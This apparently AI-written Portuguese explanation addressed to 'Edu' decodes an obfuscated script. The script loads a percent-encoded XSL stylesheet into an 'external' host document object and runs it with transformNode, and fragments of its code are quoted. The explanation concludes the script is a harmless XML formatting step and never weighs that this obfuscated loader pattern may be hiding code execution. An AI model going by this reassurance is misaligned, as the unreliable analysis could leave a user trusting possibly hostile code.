O código cria algumas variáveis (como `scopeNamespace`, `rootNode`, `mainNode`, `docNode`, `docObject`) e faz referência a um objeto `external[_0x4ad86c(0x1ec)][_0x4ad86c(0x1f1)]`. Parece estar manipulando objetos de documento (XML), carregando um XSL (estilosheet para transformar XML) e, ao final, executa uma transformação (`transformNode` ou algo similar). 

Em resumo, o que o código faz é:

1. Usa uma função `_0x53e0` e uma função `_0x1215` para mapear índices e strings — isso é parte da lógica de obfuscação. 
2. Cria um objeto XML, carrega um XSL (estilosheet XSLT) a partir de uma grande string codificada (com `unescape(...)`).
3. Depois, aplica uma transformação do documento XML usando o XSL carregado.
   
Ou seja, o código final provavelmente pega um XML, aplica uma folha de estilo XSL e gera um resultado transformado.

---

### As Funções Principais

#### Função `_0x1215()`
- Esta função retorna um array de strings muito grande e aparentemente sem sentido.  
- Este array é utilizado pela função `_0x53e0` para buscar valores de forma dinâmica.  
- Basicamente, `_0x1215()` é uma função auxiliar para obfuscação: ela contém um conjunto de strings embaralhadas/codificadas.  
- Ela só é chamada uma vez, e depois disso a referência fica armazenada.

#### Função `_0x53e0(_0x10dadc, _0x2187c3)`
- Essa função recebe dois parâmetros: `_0x10dadc` e `_0x2187c3`.  
- Internamente, ela chama a `_0x1215()` para obter o array de strings e, com base em um cálculo (`_0x10dadc - (algum valor)`), retorna um item desse array.  
- Toda vez que vemos algo como `_0x4ad86c(0x1ad)` no código, é uma chamada a `_0x53e0` passando índices que, com esse truque, procuram uma string no array retornado por `_0x1215()`.  
- Em resumo, `_0x53e0` é uma função de mapeamento: ela converte índices numéricos em strings que estão escondidas no array `_0x1215()`. Isso é usado para “desofuscar” strings ao longo do código.

---

### O Trecho `(function(_0x4f7c4e, _0xd4182a) {...})(_0x1215, ... )`

- Esta é uma função imediatamente invocada. Ela chama `_0x1215()` para obter as strings.
- Ela entra em um loop `while(!![]) { ... }` que é o mesmo que `while(true)`, e tenta decodificar um valor `_0x4427d6` através de vários `parseInt()` em strings obtidas por `_0x5504c4(...)` (que é `_0x53e0`), e faz divisões e somas.  
- A finalidade disso é provavelmente chegar a um determinado valor `_0xd4182a`.  
- Quando `_0x4427d6 === _0xd4182a`, o loop interrompe. Caso contrário, ele faz um `shift()` no array `_0x1e159e`.  
- Isso tudo é uma técnica de obfuscação: eles embaralham o array e continuam “girando” até que o resultado matemático da soma e parse de strings resulte em um número esperado. Quando alcança o valor correto, para o loop.  
- Em suma, este bloco serve para reorganizar ou inicializar corretamente o array interno ou garantir que o código só avance após certo rearranjo. É uma forma complexa e desnecessária de embaralhar dados, típica de scripts ofuscados.

---

### Variáveis e Objetos do "XML"

- `var scopeNamespace = external[_0x4ad86c(0x1ec)][_0x4ad86c(0x140)+_0x4ad86c(0xf0)];`  
  Aqui temos algo como `external.someproperty["ScopeNames" + "pace"]`, o que provavelmente vira `external.someproperty["ScopeNamespace"]`.  
  Então `scopeNamespace` deve ser algum objeto relacionado a um namespace de documento (XML).

- `rootNode = scopeNamespace[_0x4ad86c(0xf7)]()` provavelmente chama `GetRoot()`: Obtém o nó raiz de um documento.

- `mainNode = scopeNamespace[_0x4ad86c(0x290)](rootNode)` provavelmente é `GetChild(rootNode)`: obtém um nó filho do nó raiz.

- `docNode = scopeNamespace[_0x4ad86c(0xf8)](mainNode)` provavelmente `GetNext(mainNode)`: pega o próximo nó do mainNode.

- Em seguida:  
  ```
  external[_0x4ad86c(0x1ec)][_0x4ad86c(0x1f1)][_0x4ad86c(0x243)+_0x4ad86c(0x13a)] = docNode;
  (docObject = external[_0x4ad86c(0x1ec)][_0x4ad86c(0x1f1)][_0x4ad86c(0x262)+_0x4ad86c(0x182)]);
  external[_0x4ad86c(0x1ec)][_0x4ad86c(0x1f1)][_0x4ad86c(0x243)+_0x4ad86c(0x13a)] = mainNode;
  ```
  
  Isso significa: 
  - Atribui `docNode` em alguma propriedade de `external[...][...]`, provavelmente definindo o "ActiveView" ou "ActiveScope" para docNode.  
  - Atribui `docObject` a partir do mesmo local `external[...][...]`, possivelmente obtendo um documento “principal”.  
  - Depois redefine o `ActiveView` (ou equivalente) para `mainNode`.
  
  Esses nomes (`_0x4ad86c(...)`) sugerem que `docObject` pode ser um objeto do tipo `Document`.

- `var XML = docObject;`  
  Aqui, `XML` é um alias para `docObject`, ou seja, o documento XML principal está agora em `XML`.

- A linha `XML[_0x4ad86c(0x18c)] = ![];`  
  Provavelmente é `XML.async = false;`  
  Define que o carregamento ou operação no objeto XML não será assíncrona.

- `var xsl = XML;`  
  Aqui `xsl` aponta para o mesmo objeto que `XML`. Pode ser que eles estejam usando o mesmo objeto para carregar uma folha de estilo XSL (o que é estranho, mas vamos em frente).

---

### A Carga do XSL

- A seguinte chamada:
  ```
  xsl[_0x4ad86c(0x102)]( unescape(...))
  ```
  
  Provavelmente é `xsl.loadXML(unescape("..."))`.
  
  Isso significa que eles estão carregando um documento XSL (uma folha de estilo) a partir de uma string gigante, que está toda codificada e então decodificada com `unescape()`. Ou seja, aquela longa concatenação de `_0x4ad86c(...)` no `unescape()` é na verdade o código do XSL em formato percent-encoding que está sendo reconstruído em uma grande string XML/XSL.

  Então essa parte do código está pegando uma longa string obfuscada (com símbolos `%xx`) e transformando de volta num XSL válido.

- Em seguida:
  ```
  XML[_0x4ad86c(0x204)+_0x4ad86c(0x29d)](xsl);
  ```
  
  Algo como `XML.transformNode(xsl)`:
  
  Isso é típico do método `transformNode()` do MSXML (ActiveX do IE). Ele aplica a transformação XSL no documento XML usando o XSL carregado. O resultado geralmente é uma string com o XML transformado.

---

### Em Resumo das Funções:

- **`_0x53e0` e `_0x1215`**:  
  Funções de mapeamento utilizadas para desofuscar strings. Não têm funcionalidade "útil" no sentido de lógica de negócio, apenas decodificam índices para strings no array.

- **`(function(_0x4f7c4e, _0xd4182a) {...})(_0x1215, 0x43431 + 0x39629 + -0x4e1b8)`**:  
  Uma função imediatamente executada que usa `_0x1215` (o array de strings) para setar ou rearranjar o array interno usado pelas funções de desobfuscação. É um boilerplate de ofuscação.

- **`scopeNamespace`, `rootNode`, `mainNode`, `docNode`, `docObject`**:  
  Estas variáveis parecem manipular um documento XML: obtendo raiz, filho, próximo nó. Em suma, estão navegando pela árvore XML. Possivelmente `scopeNamespace` é um wrapper para funções de manipulação de nós XML, `GetRoot()`, `GetChild()`, `GetNext()` e similares.

- **`external[_0x4ad86c(...)]`**:  
  Acesso a algum objeto `external` (possivelmente fornecido pelo ambiente ou outro script), configurando propriedades internas, provavelmente definindo qual nó do documento é considerado o ativo ou principal.

- **`XML.async = false;`**:  
  Define o processamento síncrono do documento XML.

- **`xsl.loadXML(...)`**:  
  Carrega a folha de estilo XSL (o código XSL) a partir de uma string decodificada pelo `unescape()`.

- **`XML.transformNode(xsl)` ou algo parecido**:  
  Aplica a transformação XSL ao XML. Depois disso, o resultado dessa transformação pode ser utilizado para gerar um output formatado ou executado de alguma maneira.

---

### Conclusão

**Em termos práticos**, Edu, o script obfuscado:

- Desobfusca um monte de strings, provavelmente para reconstruir um XML XSLT.
- Carrega esse XSLT em um objeto XML (`xsl`).
- Tem um documento XML (`XML`) já carregado.
- Aplica a transformação XSL no XML, possivelmente para gerar um novo documento de saída, talvez HTML formatado, XML transformado ou outro resultado.

Cada funçãozinha `_0x53e0(...)` é só parte da camada de ofuscação, sem relevância funcional, apenas retorna strings. As funções do tipo `GetRoot()`, `GetChild()`, `GetNext()` sugerem que `scopeNamespace` é uma interface para navegar no XML. Finalmente, o `loadXML()` e `transformNode()` indicam a aplicação de uma folha de estilo XSL no documento XML.
*/
